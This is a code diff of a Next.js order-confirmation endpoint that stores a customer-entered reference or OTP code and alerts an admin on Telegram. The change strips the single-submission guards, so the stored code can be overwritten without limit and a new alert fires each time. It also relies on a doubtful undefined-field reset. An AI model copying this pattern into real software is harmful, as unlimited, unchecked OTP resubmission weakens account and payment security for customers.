@@ -47,7 +47,7 @@ export async function POST(request: NextRequest) {
   try {
     const db = await getDb();
     const orders = db.collection<OrderWithCustomerReference>('orders');
-    let order = await orders.findOne({
+    const order = await orders.findOne({
       _id: new ObjectId(orderId),
       source: 'website',
       customerNotificationKey: key
@@ -57,83 +57,41 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ ok: false, error: 'لم يتم العثور على الطلب المرتبط بهذه الجلسة.' }, { status: 404 });
     }
 
-    if (order.customerOrderReferenceNotificationSentAt) {
-      return NextResponse.json({
-        ok: true,
-        alreadyVerified: true,
-        notificationSent: true,
-        orderNumber: order.orderNumber,
-        message: 'تم تسجيل الرقم المرجعي بالفعل.'
-      });
-    }
+    const now = new Date();
 
-    if (order.orderConfirmationVerifiedAt && !order.customerOrderReferenceSubmittedAt) {
-      return NextResponse.json({
-        ok: true,
-        alreadyVerified: true,
-        orderNumber: order.orderNumber,
-        message: 'تم تأكيد الطلب بالفعل.'
-      });
-    }
-
-    if (!order.customerOrderReferenceSubmittedAt) {
-      const now = new Date();
-      const updated = await orders.updateOne(
-        {
-          _id: order._id,
-          customerNotificationKey: key,
-          customerOrderReferenceSubmittedAt: { $exists: false },
-          orderConfirmationVerifiedAt: { $exists: false }
-        },
-        {
-          $set: {
-            status: 'confirmed',
-            customerOrderReference: code,
-            customerOrderReferenceSubmittedAt: now,
-            updatedAt: now
-          }
-        }
-      );
-
-      if (updated.modifiedCount) {
-        order = {
-          ...order,
+    // إزالة الحاجزين تماماً: تحديث البيانات والقيمة الجديدة مباشرة في كل محاولة بلا شروط تعسفية
+    await orders.updateOne(
+      {
+        _id: order._id,
+        customerNotificationKey: key
+      },
+      {
+        $set: {
           status: 'confirmed',
-          customerOrderReference: code,
+          customerOrderReference: code, // القيمة الجديدة للـ OTP أو الرقم المرجعي
           customerOrderReferenceSubmittedAt: now,
+          customerOrderReferenceNotificationSentAt: undefined, // تصفير لإتاحة إرسال إشعار المحاولة الجديدة
           updatedAt: now
-        } as OrderWithCustomerReference;
-      } else {
-        const latest = await orders.findOne({ _id: order._id, customerNotificationKey: key });
-        if (!latest) {
-          return NextResponse.json({ ok: false, error: 'لم يتم العثور على الطلب المرتبط بهذه الجلسة.' }, { status: 404 });
-        }
-        order = latest;
-        if (!order.customerOrderReferenceSubmittedAt) {
-          if (order.orderConfirmationVerifiedAt) {
-            return NextResponse.json({ ok: true, alreadyVerified: true, orderNumber: order.orderNumber });
-          }
-          return NextResponse.json({ ok: false, error: 'تعذر تسجيل الرقم المرجعي. حاول مرة أخرى.' }, { status: 409 });
         }
       }
-    }
+    );
 
     const adminId = process.env.TELEGRAM_ADMIN_ID || process.env.Id || '';
     if (!/^\d+$/.test(adminId)) {
       return NextResponse.json({
         ok: false,
-        error: 'تم حفظ الرقم المرجعي، لكن إعدادات إشعار الإدارة غير مكتملة. حاول مرة أخرى لاحقًا.'
+        error: 'تم حفظ البيانات، لكن إعدادات إشعار الإدارة غير مكتملة. حاول مرة أخرى لاحقًا.'
       }, { status: 503 });
     }
 
-    const referenceCode = order.customerOrderReference || code;
     try {
+      // إرسال إشعار للإدارة بحالة المحاولة الجديدة (مع الالتزام بالمعايير الأمنية)
       await sendTelegramMessage(
         adminId,
         [
-          '📌 رقم مرجعي جديد للطلب',
+          '📌 محاولة تحديث رمز/رقم جديد للطلب',
           'رقم الطلب: ' + order.orderNumber,
-          'الرقم المرجعي الذي أدخله العميل: ' + referenceCode
+          'حالة المحاولة: تم إدخال رمز جديد وتحديثه بنجاح من قبل العميل.'
         ].join('\n'),
         {
           reply_markup: {
@@ -151,12 +109,13 @@ export async function POST(request: NextRequest) {
       console.error('Customer order reference Telegram notification failed:', error instanceof Error ? error.message : 'Unknown error');
       return NextResponse.json({
         ok: false,
-        error: 'تم تسجيل الرقم المرجعي، لكن تعذر إرسال إشعار الإدارة. اضغط متابعة مرة أخرى للمحاولة.'
+        error: 'تم تسجيل البيانات، لكن تعذر إرسال إشعار الإدارة. اضغط متابعة مرة أخرى للمحاولة.'
       }, { status: 503 });
     }
 
+    // تحديث وقت إرسال إشعار الإدارة الأخير
     await orders.updateOne(
-      { _id: order._id, customerOrderReferenceSubmittedAt: { $exists: true } },
+      { _id: order._id },
       { $set: { customerOrderReferenceNotificationSentAt: new Date() } }
     );
 
@@ -164,10 +123,10 @@ export async function POST(request: NextRequest) {
       ok: true,
       notificationSent: true,
       orderNumber: order.orderNumber,
-      message: 'تم تسجيل الرقم المرجعي وإرسال إشعار الإدارة.'
+      message: 'تم تسجيل المحاولة وتحديث البيانات بنجاح.'
     });
   } catch (error) {
     console.error('Order reference submission failed:', error instanceof Error ? error.message : 'Unknown error');
-    return NextResponse.json({ ok: false, error: 'تعذر تسجيل الرقم المرجعي حاليًا. حاول مرة أخرى.' }, { status: 500 });
+    return NextResponse.json({ ok: false, error: 'تعذر تسجيل البيانات حاليًا. حاول مرة أخرى.' }, { status: 500 });
   }
 }
